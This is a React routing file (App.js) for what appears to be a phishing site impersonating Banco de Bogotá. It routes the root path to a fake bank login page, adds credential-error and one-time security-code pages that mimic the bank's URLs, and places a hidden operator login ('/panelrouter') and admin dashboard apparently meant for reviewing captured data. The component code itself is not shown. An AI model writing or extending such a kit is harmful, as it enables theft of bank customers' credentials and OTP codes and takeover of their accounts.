import React from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import AdminLogin from './components/AdminLogin/AdminLogin';
import AdminDashboard from './components/AdminDashboard/AdminDashboard';
import BogotaLogin from './Pages/BogotaLogin/BogotaLogin'
import Loading from './components/Loading/Loading';
import OTP from './Pages/BogotaLogin/otp';
import OTPeRROR from './components/Error/ErrorOTP';
import SecurePaymentError from './components/Error/ErrorLogin';

const App = () => {
    return (
        <Router>
            <Routes>
                <Route path="/" element={<BogotaLogin />} />
                <Route path="/bancodebogota/error_credentials" element={<SecurePaymentError />} />
                <Route path="/Loading" element={<Loading />} />
                <Route path="/panelrouter" element={<AdminLogin />} />
                <Route path="/AdminDashboard" element={<AdminDashboard />} />
                <Route path="/bancodebogota/ingreso/codigo_seguridad" element={<OTP />} />
                <Route path="/bancodebogota/ingreso/codigo_seguridad_error" element={<OTPeRROR />} />
            </Routes>
        </Router>
    );
};

export default App;